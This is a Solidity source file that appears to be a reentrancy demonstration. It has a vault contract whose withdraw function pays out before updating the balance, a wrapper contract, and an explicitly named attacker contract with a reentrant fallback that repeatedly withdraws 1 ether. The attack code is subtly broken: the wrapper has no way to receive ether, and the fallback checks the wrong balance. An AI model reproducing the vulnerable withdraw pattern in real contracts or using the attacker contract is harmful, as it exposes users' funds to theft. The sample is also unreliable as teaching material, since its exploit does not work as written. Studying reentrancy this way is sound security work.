// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount;
    }
}

contract VulnerableCrossContract {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }

    function withdrawFromVault(uint256 _amount) external {
        vault.withdraw(_amount);
    }
}

contract AttackerCrossContract {
    VulnerableCrossContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableCrossContract(_vulnerableContract);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdrawFromVault(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableContract.depositToVault{value: 1 ether}();
        vulnerableContract.withdrawFromVault(1 ether);
    }
}
